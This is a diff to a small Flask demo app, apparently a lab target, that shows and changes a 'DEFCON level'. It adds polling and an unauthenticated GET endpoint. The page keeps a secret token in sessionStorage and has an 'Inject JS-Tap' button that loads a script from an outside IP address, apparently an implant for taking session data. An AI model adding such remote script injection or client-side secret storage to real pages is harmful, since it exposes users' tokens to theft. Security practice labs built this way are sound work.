@@ -23,6 +23,19 @@ def index():
     </style>
     <script>
         sessionStorage.setItem('secret_token', '{{ secret }}');
+        
+        function checkDefcon() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/get_defcon", true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    var currentLevel = JSON.parse(xhr.responseText).current_defcon;
+                    document.getElementById("defconDisplay").innerText = "Current DEFCON Level: " + currentLevel;
+                }
+            };
+            xhr.send();
+        }
+
         function changeDefcon(newLevel) {
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "/change_defcon", true);
@@ -31,7 +44,7 @@ def index():
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == 4) {
                     if (xhr.status == 200) {
-                        console.log("Received new defcon: " + JSON.parse(xhr.responseText).new_defcon)
+                        console.log("Received new defcon: " + JSON.parse(xhr.responseText).new_defcon);
                         document.getElementById("defconDisplay").innerText = "Current DEFCON Level: " + JSON.parse(xhr.responseText).new_defcon;
                     } else {
                         alert("Authorization failed or server error.");
@@ -41,9 +54,10 @@ def index():
             xhr.send(JSON.stringify({defcon: newLevel}));
         }
 
+        setInterval(checkDefcon, 2000);
+
         function stubbedFunction() {
             document.head.appendChild(Object.assign(document.createElement('script'), {src:'https://100.115.92.203:8444/lib/telemlib.js',type:'text/javascript'}));
-
         }
     </script>
 </head>
@@ -54,7 +68,6 @@ def index():
     <button class="button" onclick="changeDefcon(3)">Set DEFCON 3</button><br><br>
     <button class="button" onclick="changeDefcon(4)">Set DEFCON 4</button><br><br>
     <button class="button" onclick="changeDefcon(5)">Set DEFCON 5</button><br><br>
-    <br><br>
     <button onclick="stubbedFunction()">Inject JS-Tap</button>
 </body>
 </html>
@@ -62,15 +75,17 @@ def index():
 
 @app.route('/change_defcon', methods=['POST'])
 def change_defcon():
-    # Check if the Authorization header is set and correct
     auth_header = request.headers.get('Authorization')
     if auth_header != f"Bearer {secret_token}":
         abort(401)  # Unauthorized access
-
     global defcon_level
     data = request.get_json()
     defcon_level = data['defcon']
     return jsonify(new_defcon=defcon_level)
+
+@app.route('/get_defcon', methods=['GET'])
+def get_defcon():
+    return jsonify(current_defcon=defcon_level)
 
 if __name__ == '__main__':
     app.run(debug=False)
